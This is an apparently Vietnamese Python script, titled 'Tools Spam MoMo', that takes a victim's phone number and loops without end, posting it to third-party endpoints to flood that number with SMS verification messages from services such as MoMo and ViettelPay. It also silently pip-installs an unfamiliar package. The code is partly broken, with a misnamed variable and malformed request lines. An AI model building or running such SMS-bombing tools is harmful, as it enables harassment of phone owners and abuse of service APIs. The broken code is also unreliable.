import os, sys, json, os, sys, time
def cls():
	if os.name=="posix":
		os.system("clear")
	if os.name=="nt":
		os.system("cls")
try:
	import requests
except:
	print("Đang Cài Thư Viện Requests")
	os.system("pip install requests")
	print("\nĐã cài Xong Vui Lòng Chạy Lại Tools")
	exit()
try:
	import QuangHuy
except:
	print("Đang Cài Thư Viện QuangHuy")
	os.system("pip install QuangHuy")
	print("\nĐã cài Xong Vui Lòng Chạy Lại Tools")
	exit()
from datetime import datetime, timedelta
from QuangHuy import Center, Anime, Colors, Colorate
a="""\033[1;96m
    ░██████╗░██╗░░░██╗░█████╗░███╗░░██╗░██████╗░   ██╗░░██╗██╗░░░██╗██╗░░░██╗     
    ██╔═══██╗██║░░░██║██╔══██╗████╗░██║██╔════╝░   ██║░░██║██║░░░██║╚██╗░██╔╝
    ██║██╗██║██║░░░██║███████║██╔██╗██║██║░░██╗░   ███████║██║░░░██║░╚████╔╝░
    ╚██████╔╝██║░░░██║██╔══██║██║╚████║██║░░╚██╗   ██╔══██║██║░░░██║░░╚██╔╝░░
    ░╚═██╔═╝░╚██████╔╝██║░░██║██║░╚███║╚██████╔╝   ██║░░██║╚██████╔╝░░░██║░░░
    ░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░   ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░
    =====================⟩⟩⟩⟩⟩⟩⟩ Tools Spam MoMo ⟨⟨⟨⟨⟨⟨=====================\n\n   """
Anime.Fade(Center.Center(a), Colors.green_to_yellow, Colorate.Vertical, enter=True)
Anime.Fade(Center.Center(a), Colors.blue_to_red, Colorate.Vertical, enter=True)

cls()
print(a)
sđt=input("  \033[1;94mNhập SĐT: \033[1;95m")
if sđt=="0387640248":
	print("  \033[1;91m\n Ă à à thì ra mầy chọn cái chít :)))")
	exit()
stt=0
dem=0
while True:
	stt=stt+1
	tg = datetime.now().strftime("%H:%M")
	momo=requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={sdt}').
	viettelpay=requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={sdt}').
	if momo==0:
		print("  \033[1;91mSĐT này được chủ web bảo vệ")
		exit()
	status=momo["status"]
	msg=momo["msg"]
	if "success" in status:
		dem=dem+1
		print(f"  \033[1;95mMoMo \033[0m| \033[1;32mThành Công ", end="\r")
		time.sleep(1)
		print(f"  \033[1;96m{tg} \033[0m| \033[1;32mSTT: \033[1;96m{dem} \033[0m| \033[1;32mSĐT: \033[1;96m{sđt} \033[0m | \033[1;95mMoMo      ")
		print(f"  \033[1;95mViettelPay \033[0m| \033[1;32mThành Công", end="\r")
		time.sleep(1)
		print(f"  \033[1;96m{tg} \033[0m| \033[1;32mSTT: \033[1;96m{dem} \033[0m| \033[1;32mSĐT: \033[1;96m{sđt} \033[0m | \033[1;95mViettelPay")
	if "error" in status:
		print(f"  \033[1;91m{stt} \033[0m| SPAM Quá Nhanh, 1 Lúc Nữa Mới SEND ĐC", end="\r")
		continue